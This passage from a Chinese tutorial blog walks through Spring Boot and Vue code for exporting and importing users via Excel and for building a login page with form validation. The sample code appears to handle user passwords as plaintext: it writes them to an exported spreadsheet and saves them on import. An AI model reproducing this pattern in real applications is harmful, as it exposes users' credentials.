punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">// 从数据库查询所有数据</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span> list <span class=\"token operator\">=</span> userService<span class=\"token punctuation\">.</span><span class=\"token function\">list</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token comment\">// 通过工具类创建 writer 写出到磁盘路径</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token comment\">// ExcelWriter writer = ExcelUtil.getWriter(\"d:/writeBeanTest.xlsx\");</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\">// 在内存操作，写出到浏览器</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token class-name\">ExcelWriter</span> writer <span class=\"token operator\">=</span> <span class=\"token class-name\">ExcelUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">getWriter</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">// 自定义标题别名</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    writer<span class=\"token punctuation\">.</span><span class=\"token function\">addHeaderAlias</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"用户名\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    writer<span class=\"token punctuation\">.</span><span class=\"token function\">addHeaderAlias</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"password\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"密码\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    writer<span class=\"token punctuation\">.</span><span class=\"token function\">addHeaderAlias</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"nickname\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"昵称\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    writer<span class=\"token punctuation\">.</span><span class=\"token function\">addHeaderAlias</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"email\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"邮箱\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    writer<span class=\"token punctuation\">.</span><span class=\"token function\">addHeaderAlias</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"phone\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"电话\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    writer<span class=\"token punctuation\">.</span><span class=\"token function\">addHeaderAlias</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"address\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"地址\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    writer<span class=\"token punctuation\">.</span><span class=\"token function\">addHeaderAlias</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"createTime\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"创建时间\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    writer<span class=\"token punctuation\">.</span><span class=\"token function\">addHeaderAlias</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"avatarUrl\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"头像\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\">// 一次性写出 list 内对象到 excel，使用默认样式，强制输出标题</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    writer<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>list<span class=\"token punctuation\">,</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token comment\">// 设置浏览器响应的格式</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    response<span class=\"token punctuation\">.</span><span class=\"token function\">setContentType</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token class-name\">String</span> filename <span class=\"token operator\">=</span> <span class=\"token class-name\">URLEncoder</span><span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"用户信息\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"UTF-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    response<span class=\"token punctuation\">.</span><span class=\"token function\">setHeader</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content-Disposition\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"attachment;filename=\"</span> <span class=\"token operator\">+</span> filename <span class=\"token operator\">+</span> <span class=\"token string\">\".xlsx\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token class-name\">ServletOutputStream</span> out <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span><span class=\"token function\">getOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    writer<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    writer<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token class-name\">IoUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>访问接口 http://localhost:9090/user/export，获取下载的 excel</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119224303333.png\" alt=\"image-20240119224303333\" /></p>\n<h2 id=\"导入\"><a class=\"anchor\" href=\"#导入\">#</a> 导入</h2>\n<p>UserController.java</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t * excel 导入接口</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t * @param file</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t * @throws Exception</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token annotation punctuation\">@PostMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/import\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">imp</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MultipartFile</span> file<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token class-name\">InputStream</span> inputStream <span class=\"token operator\">=</span> file<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token class-name\">ExcelReader</span> reader <span class=\"token operator\">=</span> <span class=\"token class-name\">ExcelUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">getReader</span><span class=\"token punctuation\">(</span>inputStream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">// (推荐) 通过 javabean 的方式读取 excel 内的对象，但是要求表头必须是英文，跟 JavaBean 的属性要对应起来</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">// List&lt;User> list = reader.readAll(User.class);</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token comment\">// 忽略表头的中文，直接读取表的内容，但是比较死板繁琐</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">List</span><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span><span class=\"token punctuation\">></span></span> list <span class=\"token operator\">=</span> reader<span class=\"token punctuation\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span> users <span class=\"token operator\">=</span> <span class=\"token class-name\">CollUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">newArrayList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> row <span class=\"token operator\">:</span> list<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token class-name\">User</span> user <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        user<span class=\"token punctuation\">.</span><span class=\"token function\">setUsername</span><span class=\"token punctuation\">(</span>row<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        user<span class=\"token punctuation\">.</span><span class=\"token function\">setPassword</span><span class=\"token punctuation\">(</span>row<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        user<span class=\"token punctuation\">.</span><span class=\"token function\">setNickname</span><span class=\"token punctuation\">(</span>row<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        user<span class=\"token punctuation\">.</span><span class=\"token function\">setEmail</span><span class=\"token punctuation\">(</span>row<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        user<span class=\"token punctuation\">.</span><span class=\"token function\">setPhone</span><span class=\"token punctuation\">(</span>row<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        user<span class=\"token punctuation\">.</span><span class=\"token function\">setAddress</span><span class=\"token punctuation\">(</span>row<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        user<span class=\"token punctuation\">.</span><span class=\"token function\">setAvatarUrl</span><span class=\"token punctuation\">(</span>row<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        users<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    userService<span class=\"token punctuation\">.</span><span class=\"token function\">saveBatch</span><span class=\"token punctuation\">(</span>users<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>User.java 需要加入 @ToString 注解</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119224922714.png\" alt=\"image-20240119224922714\" /></p>\n<p>用 postman 测试接口，成功导入</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119225151099.png\" alt=\"image-20240119225151099\" /></p>\n<p>但是 IDEA 控制台打印输出不对，全是 null</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119225224362.png\" alt=\"image-20240119225224362\" /></p>\n<p>因为导入刚刚通过导出获取的自定义模板中有<strong>中文字符</strong>，所以注释掉中文模板，并删去 id 和 timestamp 两列（因为数据库自增），再重新导入返回 true 没有问题</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119225802302.png\" alt=\"image-20240119225802302\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119225830601.png\" alt=\"image-20240119225830601\" /></p>\n<p>插入数据库成功</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119225928644.png\" alt=\"image-20240119225928644\" /></p>\n<p>这里用<strong>方法二规定列</strong>导入数据库（有中文的 excel），接口处测试没问题</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119231629798.png\" alt=\"image-20240119231629798\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119231645741.png\" alt=\"image-20240119231645741\" /></p>\n<p>数据库刷新重新导入</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119231706993.png\" alt=\"image-20240119231706993\" /></p>\n<h2 id=\"前端实现\"><a class=\"anchor\" href=\"#前端实现\">#</a> 前端实现</h2>\n<p>先实现导出，给按钮绑定个方法</p>\n<pre><code class=\"language-vue\">&lt;el-button type=&quot;primary&quot; @click=&quot;exp&quot; class=&quot;ml-5&quot;&gt;导出&lt;i class=&quot;el-icon-caret-top&quot;&gt;&lt;/i&gt;&lt;/el-button&gt;\n</code></pre>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119232446422.png\" alt=\"image-20240119232446422\" /></p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">exp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  window<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"http://localhost:9090/user/export\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>导入需要引入<strong>新的 element 组件 el-upload</strong></p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">handleImportSuccess</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>$message<span class=\"token punctuation\">.</span><span class=\"token function\">success</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"导入成功\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">load</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>导入组件修改</p>\n<pre><code class=\"language-vue\">&lt;el-upload\n           action=&quot;http://localhost:9090/user/import&quot;\n           :show-file-list=&quot;false&quot;\n           accept=&quot;xlsx&quot;\n           :on-success=&quot;handleImportSuccess&quot;\n           style=&quot;display: inline-block&quot;&gt;\n    &lt;el-button class=&quot;ml-5&quot; type=&quot;primary&quot;&gt;导入&lt;i class=&quot;el-icon-caret-bottom&quot;&gt;&lt;/i&gt;&lt;/el-button&gt;\n&lt;/el-upload&gt;\n</code></pre>\n<p>上传 excel</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119233729131.png\" alt=\"image-20240119233729131\" /></p>\n<p>导入成功，并回显</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119233812804.png\" alt=\"image-20240119233812804\" /></p>\n<h1 id=\"用户登录\"><a class=\"anchor\" href=\"#用户登录\">#</a> 用户登录</h1>\n<p>Login.vue</p>\n<pre><code class=\"language-vue\">&lt;script&gt;\nexport default &#123;\n  name: &quot;Login&quot;,\n  data() &#123;\n    return&#123;\n      user: &#123;&#125;,\n    &#125;\n  &#125;,\n  methods: &#123;\n    login() &#123;\n      \n    &#125;\n  &#125;\n&#125;\n&lt;/script&gt;\n\n&lt;template&gt;\n  &lt;div class=&quot;wrapper&quot;&gt;\n    &lt;div  style=&quot;margin: 200px auto; background-color: #fff; width: 350px; height: 300px; padding: 20px; border-radius: 10px&quot;&gt;\n      &lt;div style=&quot;margin: 20px 0; text-align: center; font-size: 24px&quot;&gt;&lt;b&gt;登 录&lt;/b&gt;&lt;/div&gt;\n        &lt;el-input size=&quot;medium&quot; style=&quot;margin: 10px 0;&quot; prefix-icon=&quot;el-icon-user&quot; v-model=&quot;user.username&quot;&gt;&lt;/el-input&gt;\n        &lt;el-input size=&quot;medium&quot; style=&quot;margin: 10px 0;&quot; prefix-icon=&quot;el-icon-lock&quot; show-password v-model=&quot;user.password&quot;&gt;&lt;/el-input&gt;\n        &lt;div style=&quot;margin: 10px 0; text-align: right&quot;&gt;\n          &lt;el-button type=&quot;primary&quot;size=&quot;small&quot; autocomplete=&quot;off&quot; @click=&quot;login&quot;&gt;登录&lt;/el-button&gt;\n          &lt;el-button type=&quot;warning&quot;size=&quot;small&quot; autocomplete=&quot;off&quot;&gt;注册&lt;/el-button&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;style scoped&gt;\n.wrapper &#123;\n  height: 100vh;\n  background-image: linear-gradient(to bottom right, #FC466B, #3F5EFB);\n  overflow: hidden;\n&#125;\n&lt;/style&gt;\n</code></pre>\n<p>index.js 设置路由</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240120085805315.png\" alt=\"image-20240120085805315\" /></p>\n<p>前端模板大致写好后，需要在后端写接口，新建 controller/dto/<strong>UserDTO 类</strong></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240120090601600.png\" alt=\"image-20240120090601600\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240120090639367.png\" alt=\"image-20240120090639367\" /></p>\n<p>controller 新建接口</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240120090755963.png\" alt=\"image-20240120090755963\" /></p>\n<p>Alt+Enter 在 IUserService.java 创建 login 方法</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240120091330255.png\" alt=\"image-20240120091330255\" /></p>\n<p>继续点击左侧绿色箭头按钮，进入<strong> UserServiceImpl 实现类</strong>，Alt+Enter 自动实现</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240120091105813.png\" alt=\"image-20240120091105813\" /></p>\n<p>继续写前端，这里<strong>解决了问题 22</strong></p>\n<p>写了 login 方法，访问后端接口</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/user/login\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">res</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>res<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>$message<span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"用户名或密码错误\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>$router<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token number\">3000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>写退出按钮的接口</p>\n<pre><code class=\"language-vue\">&lt;el-dropdown-item style=&quot;font-size: 14px; padding: 5px 0&quot;&gt;个人信息&lt;/el-dropdown-item&gt;\n&lt;el-dropdown-item style=&quot;font-size: 14px; padding: 5px 0&quot;&gt;\n  &lt;router-link to=&quot;/login&quot; style=&quot;text-decoration: none&quot;&gt;退出&lt;/router-link&gt;\n&lt;/el-dropdown-item&gt;\n</code></pre>\n<p>给 Login.vue 加上表单验证的功能</p>\n<pre><code class=\"language-vue\">&lt;script&gt;\nexport default &#123;\n  name: &quot;Login&quot;,\n  data() &#123;\n    return&#123;\n      ruleForm: &#123;\n        username: '',\n        password: ''\n      &#125;,\n      rules: &#123;\n        username: [\n          &#123;required: true, message: '请输入用户名', trigger: 'blur'&#125;,\n          &#123;min: 3, max: 10, message: '长度在 3 到 10 个字符', trigger: 'blur'&#125;\n        ],\n        password: [\n          &#123;required: true, message: '请输入密码', trigger: 'blur'&#125;,\n          &#123;min: 6, max: 20, message: '长度在 6 到 20 个字符', trigger: 'blur'&#125;\n        ],\n      &#125;\n    &#125;\n  &#125;,\n  methods: &#123;\n    login() &#123;\n      this.$refs['ruleForm'].validate((valid) =&gt; &#123;\n        if (valid) &#123;  // 表单校验合法，不合法无请求\n          this.request.post(&quot;/user/login&quot;,this.user).then(res =&gt; &#123;\n            if (!res) &#123;\n              this.$message.error(&quot;用户名或密码错误&quot;)\n            &#125;else &#123;\n              setTimeout(() =&gt; &#123;this.$router.push('/')&#125;,3000)\n            &#125;\n          &#125;)\n        &#125; else &#123;\n          return false;\n        &#125;\n      &#125;);\n    &#125;,\n  &#125;\n&#125;\n&lt;/script&gt;\n\n&lt;template&gt;\n  &lt;div class=&quot;wrapper&quot;&gt;\n    &lt;div  style=&quot;margin: 200px auto; background-color: #fff; width: 350px; height: 300px; padding: 20px; border-radius: 10px&quot;&gt;\n      &lt;div style=&quot;margin: 20px 0; text-align: center; font-size: 24px&quot;&gt;&lt;b&gt;登 录&lt;/b&gt;&lt;/div&gt;\n      &lt;el-form :model=&quot;ruleForm&quot; :rules=&quot;rules&quot; ref=&quot;ruleForm&quot;&gt;\n        &lt;el-form-item prop=&quot;username&quot;&gt;\n          &lt;el-input\n              size=&quot;medium&quot; style=&quot;margin: 10px 0;&quot; prefix-icon=&quot;el-icon-user&quot;\n              v-model=&quot;ruleForm.username&quot;\n          &gt;\n          &lt;/el-input&gt;\n        &lt;/el-form-item&gt;\n        &lt;el-form-item prop=&quot;password&quot;&gt;\n          &lt;el-input\n              size=&quot;medium&quot; style=&quot;margin: 10px 0;&quot; prefix-icon=&quot;el-icon-lock&quot;\n              show-password v-model=&quot;ruleForm.password&quot;\n          &gt;\n          &lt;/el-input&gt;\n        &lt;/el-form-item&gt;\n      